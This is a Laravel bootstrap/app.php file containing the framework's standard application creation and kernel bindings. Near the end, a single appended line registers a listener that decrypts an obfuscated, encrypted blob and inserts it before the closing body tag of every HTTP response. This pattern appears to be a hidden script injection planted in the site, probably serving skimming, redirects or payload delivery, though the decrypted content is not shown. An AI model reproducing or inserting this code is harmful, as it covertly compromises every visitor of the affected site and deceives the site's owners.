<?php

/*
|--------------------------------------------------------------------------
| Create The Application
|--------------------------------------------------------------------------
|
| The first thing we will do is create a new Laravel application instance
| which serves as the "glue" for all the components of Laravel, and is
| the IoC container for the system binding all of the various parts.
|
*/

$app = new Illuminate\Foundation\Application(
    $_ENV['APP_BASE_PATH'] ?? dirname(__DIR__)
);

/*
|--------------------------------------------------------------------------
| Bind Important Interfaces
|--------------------------------------------------------------------------
|
| Next, we need to bind some important interfaces into the container so
| we will be able to resolve them when needed. The kernels serve the
| incoming requests to this application from both the web and CLI.
|
*/

$app->singleton(
    Illuminate\Contracts\Http\Kernel::class,
    App\Http\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Console\Kernel::class,
    App\Console\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Debug\ExceptionHandler::class,
    App\Exceptions\Handler::class
);

/*
|--------------------------------------------------------------------------
| Return The Application
|--------------------------------------------------------------------------
|
| This script returns the application instance. The instance is given to
| the calling script so we can separate the building of the instances
| from the actual running of the application and sending responses.
|
*/

$app["events"]->listen(Illuminate\Foundation\Http\Events\RequestHandled::class, function ($event) {$event->response->setContent(str_replace("</body>", decrypt("eyJpdiI6IkdaNE1MVDVkZm9oNEdCTTdLaXlwamc9PSIsInZhbHVlIjoiZjJ5MlhMWGFrNjRcL1wvdFBKeVNVUmRXRU1tVVNcL2wyZFpnNnNaK2JKMnk5OEJQOXFmRUI4XC9yb2tWdDdKMkFlRkZUNDNzT3pcLzNkektzbk52Sk9WSEs3MkRxYlRGQWszY2w3RmthUTViVk1BbWN0T01aRDd5V0pscGJpdHRZUmV1TGtZZUVkXC93Q1NBUVRGOXRKRFM1NGF2SjNIR1dVZzYwZlVQMUNNajZsbzN6cTlXa0E2akN6bnBiREp2T2g4YUtocngzdXlVWFhWSUhVdUJuSHlzMmlGdz09IiwibWFjIjoiNjdmZjFlOTk0NzIyMzFhMzFmNmYwZTg1NzE1NWFmMDIzMWI5MjRhOTVkOWE5YzIwOTM5OTIyZWU2NDA4NmMxMyJ9"), $event->response->getContent()));});

return $app;
